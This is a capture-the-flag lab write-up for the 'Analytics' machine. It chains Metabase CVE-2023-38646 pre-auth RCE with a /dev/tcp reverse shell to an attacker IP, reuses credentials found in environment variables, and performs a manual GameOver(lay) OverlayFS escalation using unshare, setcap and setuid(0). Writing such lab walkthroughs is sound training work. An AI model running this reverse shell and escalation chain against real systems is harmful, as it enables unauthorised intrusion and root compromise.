# Analytics-TJNULL-OSCP-

The exploitation lifecycle covers:
1. **Initial Footprint & Reconnaissance:** Discovering a Metabase instance web framework.
2. **Pre-Authentication Remote Code Execution (RCE):** Triggering an exploit targeting **CVE-2023-38646** to break into a Docker container.
3. **Lateral Movement:** Extracting hardcoded environment variables to secure an active SSH session on the main system.
4. **Local Privilege Escalation (LPE) & Container Escape:** Leveraging a flawless, script-free manual bypass of **GameOver(lay)** (**CVE-2023-2640** & **CVE-2023-32629**) to break Docker boundaries and capture the administrative `root` flag.

---

## 📊 Machine Specifications
* **Name:** Analytics
* **Difficulty:** Easy
* **Target IP:** `10.129.229.224`
* **Objective:** Retrieve `user.txt` and `root.txt`
* **Date of Completion:** June 16, 2026

---

## 🔍 1. Reconnaissance & Enumeration

### Network Scanning (Nmap)
A full-port TCP SYN scan was performed to map out available services:

```bash
nmap -p- --min-rate 5000 -sS -Pn -oN nmap_initial 10.129.229.224

```

*Discovered Services:*

* **Port 22/tcp:** SSH
* **Port 80/tcp:** HTTP (Enforces a redirect to `http://analytical.htb`)

### Web Infrastructure Enumeration

The host domain mapping was appended to the local `/etc/hosts` file:

```text
10.129.229.224  analytical.htb  data.analytical.htb

```

Navigating to the `data.analytical.htb` subdomain revealed an unauthenticated deployment of **Metabase**, an open-source business intelligence and data visualization suite.

---

## 🚀 2. Gaining Access (Initial Foothill)

### Vulnerability Identification

Further inspection of the Metabase components confirmed the asset was vulnerable to **CVE-2023-38646** (Pre-Authentication Remote Code Execution). This vulnerability permits arbitrary command execution through the `/api/setup/validate` endpoint by abusing a leaked setup token exposed inside the application's client-side initialization parameters.

### Remote Code Execution (RCE)

1. The required setup token was fetched via a query to `/api/session/properties`:
*Extracted Token:* `249fa03d-fd94-4d5b-b94f-b4ebf3df681f`
2. The Proof of Concept script was obtained from the public repository:
```bash
git clone [https://github.com/m3m0o/metabase-pre-auth-rce-poc.git](https://github.com/m3m0o/metabase-pre-auth-rce-poc.git)
cd metabase-pre-auth-rce-poc

```


3. A local Netcat listener was initiated on the attack machine:
```bash
nc -lvnp 4444

```


4. The exploit payload was fired against the target URL to spawn a reverse shell connection:
```bash
python3 main.py -u [http://data.analytical.htb](http://data.analytical.htb) -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.14.94/4444 0>&1"

```



The attack listener intercepted the stream, confirming an interactive shell session under the security context of the `metabase` user inside an isolated **Docker Container**.

### Lateral Movement (Container to Host)

Reviewing the current shell environment variables uncovered active system credentials explicitly mapped to the environment profiles:

```bash
env

```

*Output:*

```text
META_USER=metalytics
META_PASS=An4lyt1c_S3cur1ty_2023!

```

These credentials allowed authenticating directly to the underlying host infrastructure via SSH, stabilizing the terminal and providing immediate read access to the user flag at `/home/metalytics/user.txt`.

---

## ⚡ 3. Privilege Escalation & Container Escape

### OS & Kernel Auditing

Investigating the structural composition of the host Ubuntu environment revealed the following baseline data:

```bash
uname -a
cat /etc/os-release

```

* **OS:** Ubuntu 22.04 LTS
* **Kernel:** Outdated 5.15.0 / 6.2.0 release architecture.

The operating system was verified as vulnerable to **GameOver(lay)** (**CVE-2023-2640** & **CVE-2023-32629**). This critical vulnerability affects Ubuntu's custom **OverlayFS** implementation patches, enabling unprivileged system users to construct, manipulate, and preserve arbitrary Linux Extended Attributes and Operational Capabilities (`capabilities`) illegitimately.

### Manual Manipulation of GameOver(lay)

To avoid the instability of automated public bash wrappers (which frequently break due to Windows CRLF line termination bugs or file ownership policies), an explicit manual method injecting Linux capabilities (`cap_setuid`) on Python 3 was executed:

1. **Constructing Workspace Layers:**
The base layer structures required by the union filesystem were created under `/tmp`:
```bash
cd /tmp
rm -rf l u w m && mkdir l u w m

```


2. **Namespace Abusal & Directory Mounting:**
An isolated terminal instance was executed using `unshare -rm sh`. From within this mapped sandbox context, the OverlayFS structure was mounted, a native copy of the Python 3 executable was cloned into the unified folder view (`m/`), and the persistent capability attribute `cap_setuid` was forcefully injected:
```bash
unshare -rm sh -c 'mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && cp /usr/bin/python3 m/python3 && setcap cap_setuid+eip m/python3 && umount m'

```


3. **Vector Validation:**
Upon exiting the namespace workspace layer, the underlying Ubuntu kernel error triggered a flawed *copy-up* operation, permanently embedding the specified system capability onto the physical disk layer file (`u/`). The extended attributes were checked:
```bash
getcap u/python3

```


*Expected Output:* `u/python3 cap_setuid+eip`
4. **Triggering Administrative Execution:**
The engineered Python binary was executed with an inline statement that alters the runtime process owner constraint directly to root (`os.setuid(0)`) right before instantiating an unrestricted native Bash shell:
```bash
./u/python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'

```



The session successfully upgraded to maximum privileges. Validating system identity via `whoami` returned: **`root`**.

---

## 🏁 4. Post-Exploitation

With unrestricted administrative access over the host server, the master flag was successfully captured:

```bash
cat /root/root.txt

```

---

## 📌 Lessons Learned (OSCP Mindset)

1. **Sanitize Container Environments:** When inspecting a compromised container layout, inspecting the full runtime scope using `env` is critical. Production deployment configurations often leave sensitive hardcoded master secrets exposed.
2. **Adopt Manual Reliability:** Automated third-party kernel scripts are prone to failure due to formatting errors or strict environment mitigations. Developing fluency in native Linux primitives (`unshare`, `mount`, `setcap`) ensures high exploit reliability across diverse system restrictions.

---

## ⚠️ Disclaimer

This repository is created exclusively for educational, academic research, and authorized defensive penetration testing assessment purposes under the OSCP training scope. The author holds no liability for any unauthorized system interference or misuse of this technical documentation.

```
***

```
